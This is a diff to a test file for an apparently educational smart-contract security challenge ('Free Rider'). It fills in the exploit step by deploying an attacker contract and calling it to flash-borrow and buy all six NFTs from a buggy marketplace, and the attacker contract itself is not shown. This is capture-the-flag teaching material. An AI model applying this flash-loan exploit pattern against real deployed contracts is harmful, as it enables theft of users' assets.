@@ -104,7 +104,20 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const uniswapCallee = await (
+            await ethers.getContractFactory('AttackerFreeRiderUniswapCallee', attacker)
+        ).deploy(
+            this.uniswapPair.address,
+            this.marketplace.address,
+            this.nft.address,
+            this.weth.address,
+            this.buyerContract.address
+        );
+
+        /**
+         * Borrow and buy all NFTs - exploiting buggy code
+         */
+        await uniswapCallee.borrowAndBuyAll(NFT_PRICE, [0, 1, 2, 3, 4, 5]);
     });
 
     after(async function () {
